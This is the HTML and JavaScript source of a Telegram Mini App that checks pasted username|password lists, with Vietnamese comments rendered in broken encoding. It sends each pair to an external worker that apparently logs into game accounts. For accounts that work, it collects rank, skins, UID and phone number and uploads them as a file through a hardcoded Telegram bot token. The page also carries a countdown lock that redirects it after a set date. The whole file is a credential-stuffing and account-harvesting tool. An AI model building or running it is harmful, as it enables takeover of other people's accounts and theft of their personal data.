<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ultima Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #0a0b10; --primary: #00f2ff; --text: #e0e6ed; --panel: #13151b; --danger: #ff0055; }
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Timer Header */
        .timer-bar {
            background: rgba(255, 0, 85, 0.1); border-bottom: 2px solid var(--danger);
            padding: 10px; text-align: center; font-family: 'Roboto Mono', monospace;
            color: var(--danger); font-weight: bold; font-size: 14px;
            animation: pulse-red 2s infinite;
        }

        /* Main Layout */
        .container { flex: 1; padding: 15px; display: flex; flex-direction: column; gap: 15px; overflow: hidden; }
        
        /* Input Box */
        .input-box {
            background: var(--panel); border: 1px solid #333; border-radius: 10px;
            display: flex; flex-direction: column; height: 40%; padding: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        textarea {
            flex: 1; background: transparent; border: none; color: #a0aec0;
            resize: none; font-family: 'Roboto Mono', monospace; font-size: 12px;
        }
        
        /* Controls */
        .controls { display: flex; gap: 10px; }
        button {
            flex: 1; padding: 12px; border: none; border-radius: 6px;
            font-weight: 800; text-transform: uppercase; cursor: pointer;
            font-family: 'Rajdhani', sans-serif; font-size: 16px;
            color: #000; transition: 0.2s;
        }
        .btn-check { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
        .btn-stop { background: #333; color: #fff; display: none; }
        .btn-export { 
            background: #00ff9d; box-shadow: 0 0 10px #00ff9d; margin-top: 10px; width: 100%; display: none;
        }

        /* Result Area */
        .result-box {
            flex: 1; background: var(--panel); border: 1px solid #333; border-radius: 10px;
            padding: 10px; overflow-y: auto; font-family: 'Roboto Mono', monospace; font-size: 11px;
            display: flex; flex-direction: column; gap: 5px;
        }
        .res-row { padding: 8px; border-radius: 4px; background: #1a1d26; border-left: 3px solid #555; white-space: nowrap; overflow-x: auto; }
        .res-row.success { border-left-color: #00ff9d; background: rgba(0, 255, 157, 0.05); }
        .res-row.error { border-left-color: var(--danger); color: #ff88a0; }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }

        @keyframes pulse-red { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="timer-bar" id="countdown">‚è≥ CHECKING TIME INTEGRITY...</div>

    <div class="container">
        <div class="input-box">
            <textarea id="inputList" placeholder="Paste user|pass list here..."></textarea>
            <div class="controls">
                <button class="btn-check" id="btnCheck" onclick="startCheck()">START</button>
                <button class="btn-stop" id="btnStop" onclick="stopCheck()">STOP</button>
            </div>
            <button class="btn-export" id="btnExport" onclick="sendToBot()">üì§ G·ª¨I FILE V·ªÄ BOT</button>
        </div>

        <div class="result-box" id="resultContainer">
            <div style="color: #666; text-align: center; margin-top: 20px;">Waiting for data...</div>
        </div>
        
        <div style="display: flex; justify-content: space-between; font-size: 12px; font-weight: bold;">
            <span style="color: #00ff9d">LIVE: <span id="countOk">0</span></span>
            <span style="color: #ff0055">DIE: <span id="countFail">0</span></span>
        </div>
    </div>

    <script>
        // --- C·∫§U H√åNH ---
        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
        
        // üî¥ ƒêI·ªÄN TOKEN BOT TELEGRAM C·ª¶A B·∫†N V√ÄO ƒê√ÇY ƒê·ªÇ G·ª¨I FILE
        const BOT_TOKEN = '8404713686:AAF82GVIqgO_esbln3-T0R7NHPxOhwlLhbI'; 
        
        // üî¥ TH·ªúI GIAN T·ª∞ H·ª¶Y (Ng√†y 9/2/2026 l√∫c 00:00:00)
        // L∆∞u √Ω: Th√°ng trong JS b·∫Øt ƒë·∫ßu t·ª´ 0 (Th√°ng 2 l√† s·ªë 1)
        const DEADLINE = new Date(2026, 1, 9, 0, 0, 0).getTime(); 

        let isRunning = false;
        let stopSignal = false;
        let successList = []; // M·∫£ng ch·ª©a acc ngon ƒë·ªÉ t·∫£i v·ªÅ
        let stats = { ok: 0, fail: 0 };
        let tgUser = null;

        // 1. Kh·ªüi t·∫°o Mini App & Time Bomb
        window.onload = function() {
            const tg = window.Telegram.WebApp;
            tg.expand(); // Full m√†n h√¨nh
            tgUser = tg.initDataUnsafe?.user;

            // Ki·ªÉm tra th·ªùi gian
            setInterval(checkTimeIntegrity, 1000);
            checkTimeIntegrity();
        };

        function checkTimeIntegrity() {
            const now = new Date().getTime();
            const distance = DEADLINE - now;

            if (distance < 0) {
                // H·∫øt gi·ªù -> Chuy·ªÉn h∆∞·ªõng ngay l·∫≠p t·ª©c
                window.location.href = "baotri.html";
                return;
            }

            // T√≠nh to√°n hi·ªÉn th·ªã
            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);

            document.getElementById("countdown").innerText = 
                `‚ö†Ô∏è AUTO-LOCK IN: ${days}d ${hours}h ${minutes}m ${seconds}s`;
        }

        // 2. Logic Check
        async function startCheck() {
            const textArea = document.getElementById('inputList');
            let lines = textArea.value.split('\n').filter(line => line.trim() !== "");

            if (lines.length === 0) {
                window.Telegram.WebApp.showAlert("List tr·ªëng!");
                return;
            }

            // UI Reset
            isRunning = true;
            stopSignal = false;
            successList = []; // Reset list th√†nh c√¥ng
            document.getElementById('resultContainer').innerHTML = '';
            document.getElementById('btnCheck').style.display = 'none';
            document.getElementById('btnExport').style.display = 'none';
            document.getElementById('btnStop').style.display = 'block';
            textArea.disabled = true;

            for (let i = 0; i < lines.length; i++) {
                if (stopSignal) break;
                const line = lines[i];

                // --- X√ìA D√íNG KH·ªéI INPUT NGAY L·∫¨P T·ª®C ---
                const currentVal = textArea.value;
                // T·∫°o Regex thay th·∫ø d√≤ng hi·ªán t·∫°i v√† k√Ω t·ª± xu·ªëng d√≤ng
                const newVal = currentVal.replace(line + "\n", "").replace(line, "");
                textArea.value = newVal.trim();

                if (!line.includes('|')) continue;

                const [user, pass] = line.split('|');
                const result = await callWorker(user.trim(), pass.trim());

                if (result.status === 'success') {
                    const d = result.data;
                    // Format g·ªçn cho Mini App
                    const info = `${d.username}|${d.password} | R:${d.rank} | S:${d.skin}`;
                    addResult(info, true);
                    
                    // L∆∞u v√†o danh s√°ch t·∫£i v·ªÅ (Full data)
                    const fullLog = `${d.username}|${d.password}|UID:${d.uid}|Rank:${d.rank}|Skin:${d.skin}|Tuong:${d.tuong}|Phone:${d.sdt}`;
                    successList.push(fullLog);
                    
                    stats.ok++;
                } else {
                    addResult(`${user} -> ${result.msg || 'Fail'}`, false);
                    stats.fail++;
                }

                document.getElementById('countOk').innerText = stats.ok;
                document.getElementById('countFail').innerText = stats.fail;
                
                // Cu·ªôn xu·ªëng d∆∞·ªõi c√πng
                const container = document.getElementById('resultContainer');
                container.scrollTop = container.scrollHeight;

                await new Promise(r => setTimeout(r, 300));
            }
            stopCheck();
        }

        async function callWorker(account, password) {
            try {
                const res = await fetch(WORKER_URL, {
                    method: 'POST',
                    body: JSON.stringify({ account, password })
                });
                return await res.json();
            } catch { return { status: 'error' }; }
        }

        function stopCheck() {
            isRunning = false;
            stopSignal = true;
            document.getElementById('btnCheck').style.display = 'block';
            document.getElementById('btnStop').style.display = 'none';
            document.getElementById('inputList').disabled = false;
            
            // N·∫øu c√≥ acc ngon th√¨ hi·ªán n√∫t G·ª≠i v·ªÅ Bot
            if (successList.length > 0) {
                document.getElementById('btnExport').style.display = 'block';
                window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
            }
        }

        function addResult(text, isSuccess) {
            const div = document.createElement('div');
            div.className = `res-row ${isSuccess ? 'success' : 'error'}`;
            div.innerText = text;
            document.getElementById('resultContainer').appendChild(div);
        }

        // 3. Logic G·ª≠i File V·ªÅ Bot
        async function sendToBot() {
            if (!tgUser) {
                alert("Vui l√≤ng m·ªü b·∫±ng Telegram ƒë·ªÉ d√πng t√≠nh nƒÉng n√†y!");
                return;
            }
            if (successList.length === 0) return;

            const btn = document.getElementById('btnExport');
            btn.innerText = "‚è≥ ƒêANG G·ª¨I...";
            btn.disabled = true;

            // T·∫°o n·ªôi dung file
            const fileContent = successList.join("\n");
            const blob = new Blob([fileContent], { type: "text/plain" });
            const formData = new FormData();
            
            // T√™n file: success_time.txt
            const fileName = `success_${Date.now()}.txt`;
            
            formData.append("chat_id", tgUser.id);
            formData.append("document", blob, fileName);
            formData.append("caption", `‚úÖ CHECK HO√ÄN T·∫§T!\nüë§ User: ${tgUser.first_name}\nüì¶ S·ªë l∆∞·ª£ng: ${successList.length} acc.`);

            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                if (res.ok) {
                    window.Telegram.WebApp.showAlert("‚úÖ ƒê√£ g·ª≠i file v·ªÅ tin nh·∫Øn ri√™ng c·ªßa b·∫°n!");
                } else {
                    alert("‚ùå L·ªói g·ª≠i file. H√£y ch·∫Øc ch·∫Øn b·∫°n ƒë√£ chat v·ªõi Bot tr∆∞·ªõc ƒë√≥.");
                }
            } catch (e) {
                alert("‚ùå L·ªói m·∫°ng: " + e.message);
            }
            
            btn.innerText = "üì§ G·ª¨I FILE V·ªÄ BOT";
            btn.disabled = false;
        }
    </script>
</body>
</html>
